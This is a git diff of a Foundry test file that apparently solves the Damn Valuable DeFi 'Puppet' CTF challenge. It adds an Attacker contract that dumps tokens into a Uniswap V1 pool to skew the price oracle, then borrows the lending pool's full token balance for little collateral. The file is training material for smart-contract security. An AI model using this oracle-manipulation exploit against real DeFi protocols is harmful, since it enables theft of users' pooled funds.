@@ -8,6 +8,35 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+contract Attacker{
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+    DamnValuableToken token;
+    IUniswapV1Exchange uniswapV1Exchange;
+    PuppetPool lendingPool;
+
+    constructor(DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange, PuppetPool _lendingPool){
+        token = _token;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        lendingPool = _lendingPool;
+    }
+
+    function attack (address player, address recovery) external{
+        token.transferFrom(player, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 out = uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE,1,block.timestamp);
+        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        lendingPool.borrow{value : PLAYER_INITIAL_ETH_BALANCE}(POOL_INITIAL_TOKEN_BALANCE, address(this));
+        console.log(token.balanceOf(address(this)));
+        token.transfer(address(recovery), token.balanceOf(address(this)));
+    }
+
+    fallback() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -87,12 +116,17 @@ contract PuppetChallenge is Test {
         assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
         assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
     }
-
+ 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(DamnValuableToken(token),IUniswapV1Exchange(uniswapV1Exchange),PuppetPool(lendingPool));
+        token.approve(address(attacker),PLAYER_INITIAL_TOKEN_BALANCE);
+        payable(address(attacker)).transfer(PLAYER_INITIAL_ETH_BALANCE);
+        attacker.attack(address(player),address(recovery));
+
+
     }
 
     // Utility function to calculate Uniswap prices
